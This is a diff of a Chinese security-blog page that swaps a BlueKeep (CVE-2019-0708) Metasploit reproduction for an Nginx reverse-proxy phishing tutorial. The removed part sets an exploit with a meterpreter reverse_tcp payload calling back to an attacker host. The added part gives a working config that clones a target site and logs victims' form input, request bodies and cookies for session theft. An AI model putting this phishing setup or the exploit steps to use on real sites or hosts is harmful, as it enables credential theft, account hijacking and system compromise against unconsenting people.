@@ -16,26 +16,28 @@
   <meta name="author" content="X1ly?S">
   <meta name="keywords" content="网络安全 渗透测试">
   
-    <meta name="description" content="漏洞介绍 CVE-2019-0708，也被称为BlueKeep，是一个影响远程桌面服务（Remote Desktop Services）的漏洞。该漏洞存在于Windows远程桌面服务的处理程序中，允许攻击者在不需要用户交互的情况下远程执行任意代码，从而可能导致系统被控制或数据泄漏。这个漏洞是由于Windows远程桌面服务中处理RDP请求的部分存在一个缓冲区溢出漏洞所导致的。攻击者可以利用该漏洞发送">
+    <meta name="description" content="前言：Nginx反向代理的流程，根据Nginx反向代理配置，把访问者的请求转发给设置好的目标服务器，目标服务器接收请求后把资源转发给Nginx反向代理服务器，再由Nginx反向代理服务器转发给访问者  简介  环境准备 Linux Ubuntu VPS 安装Nginx  1sudo apt-get install nginx -y   启动Nginx  1service nginx start">
 <meta property="og:type" content="article">
-<meta property="og:title" content="RDP_CVE-2019-0708漏洞复现">
-<meta property="og:url" content="https://example.com/2024/06/12/RDP-CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="Nginx反向代理钓鱼">
+<meta property="og:url" content="https://example.com/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/index.html">
 <meta property="og:site_name" content="X1ly?S Blog">
-<meta property="og:description" content="漏洞介绍 CVE-2019-0708，也被称为BlueKeep，是一个影响远程桌面服务（Remote Desktop Services）的漏洞。该漏洞存在于Windows远程桌面服务的处理程序中，允许攻击者在不需要用户交互的情况下远程执行任意代码，从而可能导致系统被控制或数据泄漏。这个漏洞是由于Windows远程桌面服务中处理RDP请求的部分存在一个缓冲区溢出漏洞所导致的。攻击者可以利用该漏洞发送">
+<meta property="og:description" content="前言：Nginx反向代理的流程，根据Nginx反向代理配置，把访问者的请求转发给设置好的目标服务器，目标服务器接收请求后把资源转发给Nginx反向代理服务器，再由Nginx反向代理服务器转发给访问者  简介  环境准备 Linux Ubuntu VPS 安装Nginx  1sudo apt-get install nginx -y   启动Nginx  1service nginx start">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://example.com/2024/06/12/RDP-CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png">
-<meta property="og:image" content="https://example.com/2024/06/12/RDP-CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png">
-<meta property="og:image" content="https://example.com/2024/06/12/RDP-CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png">
-<meta property="article:published_time" content="2024-06-12T07:33:05.000Z">
-<meta property="article:modified_time" content="2024-06-12T07:37:45.233Z">
+<meta property="og:image" content="https://example.com/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/1.png">
+<meta property="og:image" content="https://example.com/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/2.png">
+<meta property="og:image" content="https://example.com/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/3.png">
+<meta property="og:image" content="https://example.com/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/4.png">
+<meta property="og:image" content="https://example.com/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/5.png">
+<meta property="article:published_time" content="2024-06-13T02:35:31.000Z">
+<meta property="article:modified_time" content="2024-06-13T02:39:23.010Z">
 <meta property="article:author" content="X1ly?S">
-<meta property="article:tag" content="Windows RDP远程代码执行">
+<meta property="article:tag" content="网络安全 渗透测试">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://example.com/2024/06/12/RDP-CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png">
+<meta name="twitter:image" content="https://example.com/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/1.png">
   
   
   
-  <title>RDP_CVE-2019-0708漏洞复现 - X1ly?S Blog</title>
+  <title>Nginx反向代理钓鱼 - X1ly?S Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -242,7 +244,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="RDP_CVE-2019-0708漏洞复现"></span>
+            <span id="subtitle" data-typed-text="Nginx反向代理钓鱼"></span>
           
         </div>
 
@@ -258,8 +260,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-06-12 15:33" pubdate>
-          2024年6月12日 下午
+        <time datetime="2024-06-13 10:35" pubdate>
+          2024年6月13日 上午
         </time>
       </span>
     
@@ -270,7 +272,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          586 字
+          373 字
         
       </span>
     
@@ -281,7 +283,7 @@
         
         
         
-          5 分钟
+          4 分钟
         
       </span>
     
@@ -326,12 +328,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">RDP_CVE-2019-0708漏洞复现</h1>
+            <h1 id="seo-header">Nginx反向代理钓鱼</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2024年6月12日 下午
+                    本文最后更新于 2024年6月13日 上午
                   
                 
               </p>
@@ -339,74 +341,69 @@
             
               <div class="markdown-body">
                 
-                <h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote>
-<p>CVE-2019-0708，也被称为BlueKeep，是一个影响远程桌面服务（Remote Desktop Services）的漏洞。该漏洞存在于Windows远程桌面服务的处理程序中，允许攻击者在不需要用户交互的情况下远程执行任意代码，从而可能导致系统被控制或数据泄漏。这个漏洞是由于Windows远程桌面服务中处理RDP请求的部分存在一个缓冲区溢出漏洞所导致的。攻击者可以利用该漏洞发送一个经过精心构造的RDP请求，导致远程桌面服务在处理此请求时出现缓冲区溢出。通过利用缓冲区溢出，攻击者可以将恶意代码加载到受影响系统的内存中，并最终执行该代码。攻击者可能会利用CVE-2019-0708漏洞来获取对受影响系统的完全控制权，并执行各种恶意活动，如安装后门程序、窃取敏感信息、监视用户活动等。因此，这个漏洞给系统安全带来了严重的威胁。</p>
+                <blockquote>
+<p>前言：Nginx反向代理的流程，根据Nginx反向代理配置，把访问者的请求转发给设置好的目标服务器，目标服务器接收请求后把资源转发给Nginx反向代理服务器，再由Nginx反向代理服务器转发给访问者</p>
 </blockquote>
-<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
-<li>Windows XP SP3 x86</li>
-<li>Windows XP Professional x64 Edition SP2</li>
-<li>Windows XP Embedded SP3 x86</li>
-<li>Windows Server 2003 SP2 x86</li>
-<li>Windows Server 2008 for Itanium-Based Systems Service Pack 2</li>
-<li>Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)</li>
-<li>Windows Server 2008 for 32-bit Systems Service Pack 2</li>
-<li>Windows 7 for x64-based Systems Service Pack 1</li>
-<li>Windows 7 for 32-bit Systems Service Pack 1</li>
-<li>Windows Server 2003 x64 Edition SP2</li>
-<li>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</li>
-<li>Windows Server 2008 R2 for x64-based Systems Service Pack 1</li>
-<li>Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1</li>
-<li>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)</li>
-<li>Windows Server 2008 for x64-based Systems Service Pack 2</li>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><img src="/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/1.png" srcset="/img/loading.gif" lazyload class="">
+
+<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
+<li>Linux Ubuntu VPS</li>
+<li>安装Nginx</li>
 </ul>
-<p>注:Windows 8和windows10以及之后的版本不受此漏洞影响</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
-<li>靶机：win7 SP1 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_38168838/article/details/102301839">https://blog.csdn.net/weixin_38168838/article/details/102301839</a></li>
-<li>win7  启用远程桌面服务，允许任意版本远程桌面的计算机连接</li>
-<li>开放3389端口，关闭防火墙</li>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install nginx -y<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>启动Nginx</li>
 </ul>
-<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><ul>
-<li>靶机： Win7 SP1虚拟机：192.168.141.172</li>
-<li>攻击机：kali虚拟机：192.168.141.167</li>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">service nginx start<br></code></pre></td></tr></table></figure>
+
+<h2 id="配置反向代理"><a href="#配置反向代理" class="headerlink" title="配置反向代理"></a>配置反向代理</h2><ul>
+<li>新建反向代理配置文件</li>
 </ul>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
-<li><p>进入<code>MSF</code>：msfconsole</p>
-</li>
-<li><p>查找漏洞模块，进入漏洞扫描模块：</p>
-</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">search 0708<br>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep  <br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/nginx/sites-enabled/reverse-proxy.conf<br></code></pre></td></tr></table></figure>
 
-<ol start="3">
-<li>设置扫描目标，开始扫描:</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> rhosts 192.168.141.171<br>run<br></code></pre></td></tr></table></figure>
-<img src="/2024/06/12/RDP-CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" srcset="/img/loading.gif" lazyload class="">
-
-<ol start="4">
-<li>进入漏洞利用模块：</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce<br></code></pre></td></tr></table></figure>
-
-<ol start="5">
-<li>设置攻击参数</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp      <br><span class="hljs-built_in">set</span> rhosts 192.168.141.172                             <br><span class="hljs-built_in">set</span> lhost 192.168.141.167              			<br><span class="hljs-built_in">set</span> rdp_client_ip 192.168.141.172      		   <span class="hljs-comment">#目标机ip</span><br><span class="hljs-built_in">unset</span> RDP_CLIENT_NAME               		  <span class="hljs-comment">#取消设置这个参数</span><br><span class="hljs-built_in">set</span> target 1    						   <span class="hljs-comment">#设置攻击目标</span><br></code></pre></td></tr></table></figure>
-
-<ol start="6">
-<li>攻击 Windows 7 SP1 x64 与 Windows 2008 R2 x64的EXP不太稳定，(更换EXP即可 <a target="_blank" rel="noopener" href="https://github.com/biggerwing/CVE-2019-0708-poc">https://github.com/biggerwing/CVE-2019-0708-poc</a> )  对 Windows 7 SP1 x64攻击有蓝屏现象，单核服务器上成功率约90%, 双核上 40-60%, 四核上10%，如果失败，目标系统会被打成蓝屏</li>
-</ol>
-<img src="/2024/06/12/RDP-CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" srcset="/img/loading.gif" lazyload class="">
-
-<h2 id="漏洞批量发现"><a href="#漏洞批量发现" class="headerlink" title="漏洞批量发现"></a>漏洞批量发现</h2><ul>
-<li>工具：<a target="_blank" rel="noopener" href="https://pan.baidu.com/share/init?surl=NeaYWuIFoRs0xCHW4S_ntw">https://pan.baidu.com/share/init?surl=NeaYWuIFoRs0xCHW4S_ntw</a>  提取码：n3zm</li>
+<ul>
+<li>配置</li>
 </ul>
-<img src="/2024/06/12/RDP-CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" srcset="/img/loading.gif" lazyload class="">
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">server<br>&#123;<br>    listen 80; <span class="hljs-comment"># 监听端口</span><br>    server_name 1.2.3.4; <span class="hljs-comment"># 本机真实IP</span><br>    location / &#123;<br>        proxy_pass http://xxx.xxx.xxx.xxx; <span class="hljs-comment"># 反代的网站，即想要伪造的网站</span><br>        proxy_set_header Host <span class="hljs-variable">$host</span>;<br>        proxy_set_header X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>        proxy_set_header X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>    &#125;<br>    access_log /var/log/nginx/access_log_8081.<span class="hljs-built_in">log</span> testLog; <span class="hljs-comment"># 日志保存位置，testLog为自定义的日志格式</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>编辑Nginx配置文件</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/nginx/nginx.conf<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>找到这两行</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">include /etc/nginx/mime.types;<br>default_type application/octet-stream;<br></code></pre></td></tr></table></figure>
+
+<p>在这两行下面添加2句</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">log_format testLog escape=json <span class="hljs-string">&#x27;$request_filename $http_x_forwarded_for $fastcgi_script_name $document_root $request_body&#x27;</span> <span class="hljs-variable">$http_cookie</span>;<br>include /etc/nginx/sites-enabled/reverse-proxy.conf;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>重启Nginx</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">service nginx restart<br></code></pre></td></tr></table></figure>
+
+<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><ul>
+<li>目标网站</li>
+</ul>
+<img src="/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/2.png" srcset="/img/loading.gif" lazyload class="">
+
+<ul>
+<li>这是攻击者的Nginx反向代理服务器看到的页面</li>
+</ul>
+<img src="/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/3.png" srcset="/img/loading.gif" lazyload class="">
+
+<ul>
+<li>如果受害者在攻击者的这个Nginx反向代理服务器的页面输入表单，所有输入，cookie session都会被攻击者截获，可在日志查看！</li>
+</ul>
+<img src="/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/4.png" srcset="/img/loading.gif" lazyload class="">
+
+<img src="/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/5.png" srcset="/img/loading.gif" lazyload class="">
 
 <blockquote>
-<p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119488520">https://blog.csdn.net/weixin_45588247/article/details/119488520</a></p>
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2069868">https://cloud.tencent.com/developer/article/2069868</a></p>
+<p>参考：<br><a target="_blank" rel="noopener" href="https://bblog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/09.%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC/03.nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC.html">https://bblog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/09.%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC/03.nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC.html</a></p>
 </blockquote>
 
                 
@@ -416,34 +413,6 @@
             <div>
               <div class="post-metas my-3">
   
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-chain-item">漏洞复现</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/Windows-RDP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="print-no-link">#Windows RDP远程代码执行</a>
-      
-    </div>
   
 </div>
 
@@ -455,18 +424,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/" title="Nginx反向代理钓鱼">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Nginx反向代理钓鱼</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/06/10/%E6%9F%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD%E6%9C%BA%E6%9E%84%E7%9A%84%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E5%A4%84%E5%AD%98%E5%9C%A8%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E/" title="某网络安全培训机构的教学平台修改密码处存在逻辑缺陷漏洞">
-                        <span class="hidden-mobile">某网络安全培训机构的教学平台修改密码处存在逻辑缺陷漏洞</span>
+                      <a href="/2024/06/12/RDP-CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="RDP_CVE-2019-0708漏洞复现">
+                        <span class="hidden-mobile">RDP_CVE-2019-0708漏洞复现</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
